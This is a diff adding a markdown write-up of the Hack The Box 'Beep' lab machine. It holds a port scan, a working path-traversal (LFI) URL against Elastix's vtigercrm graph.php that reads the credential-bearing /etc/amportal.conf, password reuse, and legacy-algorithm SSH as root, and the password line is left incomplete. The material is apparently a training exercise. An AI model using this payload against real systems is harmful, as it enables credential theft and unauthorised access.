@@ -1,0 +1,90 @@
+# 💥 Hack The Box – Beep
+
+**IP:** `10.129.171.151`  
+**OS:** Linux  
+**Difficulty:** Easy  
+**Status:** ✅ Rooted  
+
+---
+
+## ⚙️ Environment Setup
+```bash
+mkdir Beep && cd Beep
+# (Optional) Add to /etc/hosts for easy access
+echo "10.129.171.151 beep" | sudo tee -a /etc/hosts
+```
+
+---
+
+## 🔍 Full Port Scan
+```bash
+nmap -sS -sV -sC -p- -T4 -Pn -oN fullscan.txt beep
+```
+
+### 🔎 Relevant Ports
+- **80** → Apache 2.2.3 (CentOS)
+- **443** → Apache 2.2.3 + Elastix Login page
+- **10000** → Webmin interface
+- Various legacy services (SSH 4.3, SMTP, IMAP, etc.)
+
+---
+
+## 🌐 Web Enumeration
+### 1. Visit main pages:
+```bash
+https://beep   # Elastix Login page
+```
+
+## 🎯 Exploitation – LFI in Elastix
+```http
+http://beep/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+```
+
+🔍 View **page source** → search for:
+```
+ctrl + F → password
+```
+
+🧠 Found reused password multiple times → try it for login.
+
+### 🧑‍💻 Access Elastix Panel
+- **User:** `admin`  
+- **Password: 
+
+---
+
+## 🔐 SSH Access (Legacy Fix)
+
+The server uses old SSH algorithms. Use:
+
+```bash
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 \
+    -oHostKeyAlgorithms=+ssh-rsa root@beep
+```
+
+🧠 This forces support for legacy key exchange methods (used by OpenSSH 4.x)
+
+---
+
+## 🧨 Post-Exploitation
+
+### 🔎 User Flag
+```bash
+cd /home/fanis
+cat user.txt
+```
+
+### 🔎 Root Flag
+```bash
+cd /root
+cat root.txt
+```
+
+---
+
+## 📝 Notes
+
+- Exploit: LFI via `graph.php` (Elastix)
+- Direct SSH root login (no priv esc needed)
+✅ Commands tested and verified  
+
